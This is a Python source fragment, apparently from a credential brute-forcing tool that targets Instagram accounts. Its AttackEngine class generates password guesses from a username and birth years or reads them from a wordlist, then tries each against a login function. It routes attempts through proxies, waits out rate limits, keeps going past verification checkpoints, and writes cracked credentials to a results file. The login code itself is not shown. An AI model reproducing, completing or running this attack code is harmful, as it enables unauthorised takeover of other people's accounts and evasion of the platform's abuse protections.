class AttackEngine:
    """Manages the attack process."""

    def __init__(self, ui, engine):
        self.ui = ui
        self.engine = engine
        self.running = False
        self.stop_event = threading.Event()
        self.found_password = None

    def auto_attack_smart(self, username):
        """Smart mode: generates passwords from username and tests them."""
        self.ui.clear()
        self.ui.print_banner()

        self.ui.print_status(f"Target: {username}", Colors.CYAN)
        self.ui.print_status("Generating smart password combinations...", Colors.WARNING)

        # Generate password candidates
        passwords = PasswordGenerator.from_username(username)

        # Add some common extra passwords
        passwords.extend([
            f"{username}{year}" for year in ["1990","1991","1992","1993","1994","1995",
                                              "1996","1997","1998","1999","2000","2001",
                                              "2002","2003","2004","2005"]
        ])

        # Remove duplicates while preserving order
        seen = set()
        passwords_unique = []
        for p in passwords:
            if p not in seen:
                seen.add(p)
                passwords_unique.append(p)

        total = len(passwords_unique)
        self.ui.print_success(f"Generated {total} smart password candidates")

        input(f"{Colors.DIM}Press Enter to start attack...{Colors.END}")
        self._run_attack(username, passwords_unique)

    def auto_attack_wordlist(self, username, wordlist_path):
        """Wordlist mode: tests passwords from a file."""
        self.ui.clear()
        self.ui.print_banner()

        self.ui.print_status(f"Target: {username}", Colors.CYAN)
        self.ui.print_status(f"Wordlist: {wordlist_path}", Colors.CYAN)

        if not os.path.exists(wordlist_path):
            self.ui.print_error(f"Wordlist not found: {wordlist_path}")
            return

        passwords = PasswordGenerator.from_wordlist(wordlist_path)
        total = len(passwords)
        self.ui.print_success(f"Loaded {total} passwords from wordlist")

        input(f"{Colors.DIM}Press Enter to start attack...{Colors.END}")
        self._run_attack(username, passwords)

    def _run_attack(self, username, passwords):
        """Core attack loop."""
        self.running = True
        self.stop_event.clear()
        self.engine.start_time = time.time()
        total = len(passwords)

        # Proxy config
        print()
        use_proxies = self.ui.get_input("Use proxies? (y/n)", "n").lower() == 'y'
        proxies = []
        if use_proxies:
            proxy_file = self.ui.get_input("Proxy file path", "proxies.txt")
            if os.path.exists(proxy_file):
                with open(proxy_file) as f:
                    proxies = [line.strip() for line in f if line.strip()]
                self.ui.print_success(f"Loaded {len(proxies)} proxies")
            else:
                self.ui.print_warning("Proxy file not found. Running without proxies.")

        delay = float(self.ui.get_input("Delay between attempts (seconds)", "0.5"))

        self.ui.clear()
        self.ui.print_banner()

        # Display target info
        print(f"""
{Colors.CYAN}  ┌───────────────── TARGET INFO ─────────────────┐{Colors.END}
{Colors.CYAN}  │{Colors.END}                                              {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  │{Colors.END}  Username:     {Colors.WHITE}{username:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  │{Colors.END}  Passwords:    {Colors.WHITE}{total:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  │{Colors.END}  Delay:        {Colors.WHITE}{delay:<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  │{Colors.END}  Proxies:      {Colors.WHITE}{len(proxies):<30}{Colors.END}  {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  │{Colors.END}                                              {Colors.CYAN}│{Colors.END}
{Colors.CYAN}  └──────────────────────────────────────────────────┘{Colors.END}

{Colors.WARNING}  [!] Press Ctrl+C at any time to stop.{Colors.END}
""")

        time.sleep(1)

        # Main attempt loop
        try:
            for i, password in enumerate(passwords, 1):
                if self.stop_event.is_set():
                    break

                # Display progress
                percent = (i / total) * 100
                elapsed = time.time() - self.engine.start_time
                rate = i / elapsed if elapsed > 0 else 0
                eta = (total - i) / rate if rate > 0 else 0
                eta_str = f"{int(eta//60)}m {int(eta%60)}s" if eta > 0 else "0s"

                # Print attempt line
                masked_pass = password[:4] + '*' * min(len(password)-4, 4) if len(password) > 4 else '****'
                sys.stdout.write(
                    f"\r{Colors.DIM}[{Colors.END}{Colors.GREEN}{i:>6}/{total}{Colors.END}{Colors.DIM}]{Colors.END} "
                    f"{Colors.CYAN}[{percent:5.1f}%]{Colors.END} "
                    f"{Colors.WHITE}Testing: {masked_pass:<12}{Colors.END} "
                    f"{Colors.DIM}| {rate:.1f}/s | ETA: {eta_str}{Colors.END}   "
                )
                sys.stdout.flush()

                # Attempt login
                success, message = self.engine.test_login(username, password)

                if "SUCCESSFUL" in message:
                    print("\n")
                    self.ui.print_success("=" * 50)
                    self.ui.print_success(message)
                    self.ui.print_success("=" * 50)
                    self.found_password = password
                    # Save to file
                    self._save_result(username, password)
                    break

                elif "CHALLENGE" in message or "CHECKPOINT" in message:
                    print(f"\n{Colors.WARNING}[!] {message} - Instagram wants verification{Colors.END}")
                    cont = self.ui.get_input("Continue? (y/n)", "y").lower() == 'y'
                    if not cont:
                        break

                elif "RATE_LIMITED" in message or "THROTTLED" in message:
                    print(f"\n{Colors.WARNING}[!] Rate limited. Waiting 60 seconds...{Colors.END}")
                    time.sleep(60)

                elif "PROXY_ERROR" in message and proxies:
                    # Try next proxy
                    continue

                # Delay between attempts
                time.sleep(delay)

        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Attack stopped by user.{Colors.END}")

        # Final stats
        elapsed = time.time() - self.engine.start_time
        print(f"\n\n{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}Attack Complete{Colors.END}")
        print(f"  Total attempts: {self.engine.attempt_count}")
        print(f"  Time elapsed:   {int(elapsed//60)}m {int(elapsed%60)}s")
        print(f"  Average rate:   {self.engine.attempt_count/elapsed:.1f}/s" if elapsed > 0 else "")
        if self.found_password:
            print(f"  {Colors.GREEN}Password found: {self.found_password}{Colors.END}")
        else:
            print(f"  {Colors.RED}Password not found in this list{Colors.END}")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")

        self.running = False

        input(f"\n{Colors.DIM}Press Enter to return to menu...{Colors.END}")

    def _save_result(self, username, password):
        """Save found credentials to file."""
        result_file = f"{APP_NAME}_results.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(result_file, "a") as f:
            f.write(f"[{timestamp}] {username}:{password}\n")
        self.ui.print_success(f"Result saved to {result_file}")


